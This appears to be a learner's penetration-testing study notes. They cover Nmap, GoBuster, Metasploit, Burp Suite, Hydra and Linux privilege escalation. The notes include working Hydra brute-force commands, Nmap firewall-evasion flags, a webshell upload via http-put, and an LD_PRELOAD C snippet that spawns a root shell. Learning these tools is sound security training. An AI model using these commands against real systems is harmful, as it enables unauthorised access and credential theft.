##  GoBuster
Is a brute force attack that help find hidden directories and pages, it will take a list of potential page or directory names and tries accessing a website with each of them.

gobuster dir -u https://192.168.x.x -w /usr/share/wordlists/dirb/common.txt

-e print full URLs of discovered paths
-u website
-w directory for the wordlist

pages with status 200 are correct.

##  NMap

Port scanning tool.
-sT TCP
*   If we send an TCP request to an open port we have SYN > SYN,ACK > ACK.
*   If we send an TCP request to a close port we have SYN > RST(Reset).
Many firewalls are configured to drop incoming packets even if the port is open, so if we receive nothing back that's the case.

-sS SYN half open
Are used to scan the TCP port-range of a target or targets, SYN scans are sometimes referred to as Half open or Stealth.
TCP send back an RST instead an ACK at the end. This prevent the server from repeatedly trying to make the request.
*   SYN scans are often not logged by application listening on open ports.
SYN scans arefaster than a TCP scan.
*   They need sudo permissions to full work in linux, this because it requires to create ra packets.
*   Unstable services are sometimes brought down by SYN scans.

-sU UDP scans
UDP is a stateless connection, this means that when a packet is sent to an UDP port should not be any response. Nmap refers tot he port as being open|filtered, in other word the port is open but it could be firewalled. If it gets response the port is marked as open. 
When the port is closed nmap receive the unreachable message. For this usually are scanned only a close number of UDP ports using this
namp -sU --top-ports 20 "target".

```
-sN TCP null
Are TCP requests with no flags set at all(no SYN flag so the next step will be an RST,ACK flag). The target should respond with RST if the port is closed.

-sF TCP FIN scans
This instead pf sending a completly empty packet, a request is sent with the FIN flag(ususally used to gracefully close an active connect). Nmap expect RST if the port is closed.

-sX TCP Xmas
This send an malformed packets(using PSH, URG and FIN flags) and expect an RST response for closed port.

The expected response for open ports with these 3 scans is identical and very similar to that of the UDP scan(open|filtered, closed, or filtered).
Windows and a lot of Cisco network devices are know to respond with a RST to any malformed TCP packet. 
This result in all ports showing up as being closed. 
These are used to bypass firewall security, by sending that not containt the SYN flag we bypass this kind of firewall.
```
# IP with actives hosts

We use the "ping sweep", nmap sends an ICMP packet to each possible IP for the specified network.
```nmap -sn 192.168.0.1-254 / nmap -sn 192.168.0.0/24```
The -sN tells to don't scan for ports, first rely on ICMP echo packets(ARP on a local network if run with sudo or directly as the root user). This also cause nmap to send an TCP SYN packet to port 443 of the target as well as a TCP ACK(or TCP SYN if no as root) packet to port 80 of the target.

# Nmap Script Engine(NSE)

Nmap scripts are written in the Lua language.
    safe: don't affect the target
    intrusive: likely affect the target
    vuln: scan for vulnerabilities
    exploit: attempt to exploit a vulnerability
    auth: bypass authentication for running services
    brute: bruteforce credentials
    discovery: query running services for futher information about the network.
All script are [here](https://nmap.org/book/nse-usage.html).


To run one of ths¡ose script we use --script="script-name".
Can be used multiply scripts at once 
```--script=smb-enum-users,smb-enum-shares```.
There script that need credentials, like the http-put(upload files using the put method)
```nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'```.
Nmap has also help manus accessible usin 
```nmap --script-help "script-name"```.

The machine stores all script in */usr/share/nmap/scripts*. 
It is possible to serach for words like
```grep "ftp" /usr/share/nmap/scripts/scripts.db```
```ls -l /usr/share/nmap/scripts/*ftp*```
```grep "safe" /usr/share/nmap/scripts/script.db```.

If we want to install scripts not already presents, we can download from the web using ```sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap/scripts/<script-name>.nse``` and than update the table using ```nmap --script-updatedb```.

## Firewall evasion

Nmap will consider a host with this config as dead and not bother scanning it at all.
-Pn tells Nmap to not bother pinging the host before scanning it, this means that nmap will always treat the target host as being alive, bypassing the ICMP block.
-f fragment the packets making them less lickely to being identified from a firewall
    --mtu "number" accepts a maximum transmission unit size to use for the packets sent. Must be a multiple of 8.
--scan-delay "times"(ms) add a delay between packets sent, if sentwork is unstable but also for evading any time-based fireaal/IDS
--badsum is used to generate in invalid checksume for packets(some data do not correspond to the original one), any real TCP/IP stack would drop this packet, however firewalls may potentially respond automatically withouth bother to check it.
--data-length "number of bytes" tells nmap to generate random bytes and append them as data in the request.
[Other way to avoid firewall with Nmap](https://nmap.org/book/man-bypass-firewalls-ids.html).

## Metaslpoit

Is the most used exploitation framework.
The pro version is the commercial one that facilitates the automatation and management of tasks with a GUI and the framework version is open-source that use CMD.

This tool allow infomation gathering, scannin, exploitation, exploitation development, post-exploitation and more.

*   msfconsole: main CMD interface
*   Modules: supporting modules like exploits, scanners, payload, etc
*   Tools: Stand alone tools that will help vulnerability research, assessment or penetration testing. Some of them are msfvenom, patter_create and patter_offset.

*   Exploit: a piece of code that uses a vulnerability
*   Vulnerability: a design, coding or logic flaw affecting the system.
*   Payload: an exploit will take advantage of a vulnerability, but if we want to reach the result we want we must use playloads(code that is esecuted on the target system).


ALL OF THE NEXT WILL BE LOCATED IN ```/usr/share/metasploit-framework/modules```

# Auxiliary
Any supporting module like scanners, crawlers and fuzzers.

# Encoders
These will allow to encode the exploit and payload in the hope that a signature based antivirus solution may miss them. AntiVirus have a database of known threats, they detect them by comparing suspicious files to their database and riase an alert if there is a match.

# Evasion
While encoders will encode the payload, evasion should not be considered a direct attempt to evade antivirus software. Meanwhile evasion modules will try that, with more or less succes.

# Exploits
Organized by target system.

# NOPs
No Operation do nothing. They are used to make the PC do nothing for 1 cycle, are used as a buffer to achieve consistent payload sizes.

# Payloads
Are codes that will be executed in the target system.
They will leverage a vulnerability on the target system but we will also need an payload. Metasploit offers the ability to send different payloads that can open shells on the target system.
*   Adapters: wraps single payloads to convert them into different formats.(Ex: a normal payload can be wrapped inside a Powershell adapter which will make a single powershell command that will execute the payload).
*   Singles: self contained payloads that don't need to download an additional component to run.
*   Stagers: they set up a connection between Matesploit and the target system, usefull with "staged payloads"(they will first upload a stager on the target system than download the rest of the payload). This provides advantage as the initial size of the payload will be relatively small.
*   Stages: download by stager, this allow you to use larger sized payloads.
```
Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.
*       generic/shell_reverse_tcp
*       windows/x64/shell/reverse_tcp
The first is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. While the last is a staged payload, as indicated by the “/” between “shell” and “reverse”.
```

# Post
Will be usefull on the final stage of the penTesting process listed above.

## Metasploit CMD

Using a modules with `use exploit/linux/....`.
Using `show options` we see the current configuration used atm.
With `back` u go out of the exploit menu and go back to normal metasploit framework.
Using `info` while in an submenu it will display all the information about.
With `search ....` will search the metasploit framework database for modules relevant to the given search parameter.

# Ranking

Exploits are ranked by their reliability.

*   ExcellentRanking: The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances (WMF Escape()).
*   GreatRanking: The exploit has a default target AND either auto-detects the appropriate target or uses an application-specific return address AFTER a version check.
*   GoodRanking: The exploit has a default target and it is the “common case” for this type of software (English, Windows 7 for a desktop app, 2012 for server, etc). Exploit does not auto-detect the target.
*   NormalRanking: The exploit is otherwise reliable, but depends on a specific version that is not the “common case” for this type of software and can’t (or doesn’t) reliably autodetect.
*   AverageRanking: The exploit is generally unreliable or difficult to exploit, but has a success rate of 50% or more for common platforms.
*   LowRanking: The exploit is nearly impossible to exploit (under 50% success rate) for common platforms.
*   ManualRanking: The exploit is unstable or difficult to exploit and is basically a DoS (15% success rate or lower). This ranking is also used when the module has no use unless specifically configured by the user (e.g.: exploit/unix/webapp/php_eval).

You can make a search utilizing the rank `search type:auxiliary telnet`

# HANDS ON MODULES

A web exploit could have an RPORT (remote port: the port on the target system Metasploit will try to connect to and run the exploit) value preset to 80, but your target web application could be using port 8080.
In case there are some options (`show options`) you want to change, just use `set <option> <value>`(F.E. change RHOST to an IP `set RHOST <ip>`). Or you can bring everything to default using `unset all` or `unset <option>` for just one option.
You can set `setg`(set global) to set all the variable you will use for all modules.

*   RHOST: remote host, the IP address of the target system. Is possible to set a range of IP or using an text file with all the IP you want to attack.
*   RPORT: remote port, the port of the target system where the vulnerable application is running on
*   PAYLOAD: the payload you will use with the exploit
*   LHOST: localhost, the attacking machine IP 
*   LPORT: local port, the port you will use for the reverse shell to connect back to. You can set any port not used by another app.
*   SESSION: each session will have an ID.

Launch an exploit with `exploit`, with `-z` the command will run the exploit and background the session as soon as it opens.
Once the exploit end, you can choose to set the session created as background using `background`, and with `session` you have a list of existing sessions. To open any session `session <ID>`.

## Burp Suite

Is a framework written in java. Is used for web application security and assessing mobile applications.
Burp can capture and manipulate all of the traffic between an attacker and a server.

# Tools
*   Proxy: intercept and modify requests/response when interacting with web application
*   Repeater: capture, modify then resend the same request numerous times, this feature is awesome when we need to make an payload through trial and error(SQL injection) or when testing functionality of an endpoint for flaws.
*   Intruder: spray an endpoint with requests, used to bruteforce fuzz endpoints.
*   Decoder: provides a valuable service when tranforming data, decoding captured information or encondign a payload prior to sending it to the target.
*   Comparer: compare two pieces of data at either word or byte level. This isn't unique of Burp Suite, but being able to send pieces of data directly into a comparison tool with a single keyboard shortcut can speed things up.
*   Sequencer: it assess the randomness of tokens sucha as session coockie values or other supposedly random generated data, if the algorithm don't create random vlaues then this could open up some devastatinv avenues for attack.

Burp accept extension from other languages like python and ruby.

# Intercept HTTP using proxy

Go on proxy menu and active the `Intercept is off`.
User settings affect the Burp Suite as a whole and will be applied every time we open the app, meanwhile project settings will only be applied to the current project, and at the re-open of the app those changes will be lost.



## Hydra

Is a brute force online password cracking program. Is used to guess passwords on an particular service(SSH, Web Application , FTP or SNMP).
If we want to brute force by FTP we can use `hydra -l "username" -P "passlist.txt" ftp://machine_ip`.

# SSH
`hydra -l admin -P passowrds.txt IP -t 4 ssh`

# Post web form

You must know which type of request it is making(GET or POST).
`sudo hydra -l "username" -P "wordlist" 10.10.61.176 http-post-form "/:username=^User^&password=^PASS^:F=incorrect" -V`.
After the `/` we enter the path where the form login is placed, than change the `^USER^` with the user we already have.

## Privilege escalation

Allows to go from a low privilege account to ones with more.

`uname -a` print system information, usefull to search for any potential kernel information.
`/proc/version` provides info about the target system processes, kernel version and additional data.
`/etc/issue` systems can also be identified here. This usually contains some info about the OS but can easily be customized or changed.
`ps` list the process, `ps -A` view all running processes, `ps axjf` view process tree, `ps aux` show processes for all users(a), the user who launched the process(u), and that are not attached to a terminal(x)
    PID: The process ID (unique to the process)
    TTY: Terminal type used by the user
    Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    CMD: The command or executable running (will NOT display any command line parameter)
`env` show environments variables. the PATH variable may contain a compiler or a scripting language.
`sudo -l` show commands that the user can use.
`id` provide a general overview of the user's privilege level and group memberships.
`/etc/passwd` is a easy way to discover users, the output can be cut with `cat /etc/passwd | cut -d ":" -f 1`. Using `grep home` we have only the non system users.
`ip route` show which network routes exist.
`netstat` gather information about the connextions
*   -a show all listing ports and established connections
*   -at or -au list TCP or UDP protocols
*   -l ports in listening mode, with t it will show only ports which listen to TCP, u for UDP.
*   -s network usage statistics by protocol
*   -tp list connections with the service name and PID info
*   -i shows interface statistics
*   -ano 
    *   -a display all sockets
    *   -n not resolve names
    *   -o display timers
When the PID/Programm name is empity we understand that the process is owned by another user.
`find`
*   find . -name flag1.txt: find the file named “flag1.txt” in the current directory
*   find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
*   find / -type d -name config: find the directory named config under “/”
*   find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
*   find / -perm a=x: find executable files
*   find /home -user frank: find all files for user “frank” under “/home”
*   find / -mtime 10: find files that were modified in the last 10 days
*   find / -atime 10: find files that were accessed in the last 10 day
*   find / -cmin -60: find files changed within the last hour (60 minutes)
*   find / -amin -60: find files accesses within the last hour (60 minutes)
*   find / -size 50M: find files with a 50 MB size
    *   can be used + or - to search files bigger or smaller than a quantity find / -size +50M
*   redirect all errors to /dev/null with `-type f 2>/dev/null`
*   find / -writable -type d 2>/dev/null : Find world-writeable folders
*   find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
*   find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
*   find / -perm -o x -type d 2>/dev/null : Find world-executable folders
Check for supported languages
*   find / -name perl*
*   find / -name python*
*   find / -name gcc*
*   find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

# Tools for privilege escalation
[LinPeans]( https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
[LinEnum]( https://github.com/rebootuser/LinEnum)
[LES(Linux Esploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
[Linux Smart Enumeration]( https://github.com/diego-treitos/linux-smart-enumeration)
[Linux Priv Checker]( https://github.com/linted/linuxprivchecker)

# Leverage application function
Some app will not have an exploit.

For example, apache2 command admite config file using -f, using /etc/shadow file using this method will result into an error that includes the first line of the /etc/passwd.

# Leverage LD_PRELOAD

On some system we might see the LD_PRELOAD(sudo -l) environment option, this a function that allowa any program to use shared libraries. [More info about LD_PRELOAD](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/).
If the env_keep option is enables we can generate a shared library which will be loaded and executed before the program is run.
    1) Check for LD_PRELOAD
    2) Write a simple C code as a share object
    3) Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file.
The c code for spawn an root shell is this:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
and then compile it as shared library `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`.
After that we just need to run the program by specifying the LD_PRELOAD `sudo LD_PRELOAD=/home/user/ldpreload/shell.so find` and this will spawn an root shell.

Files that can be executed only by the file owner or the group owner, this is indicated by files/directory with `s` in ls -l. `find / -type f -perm -04000 -ls 2>/dev/null`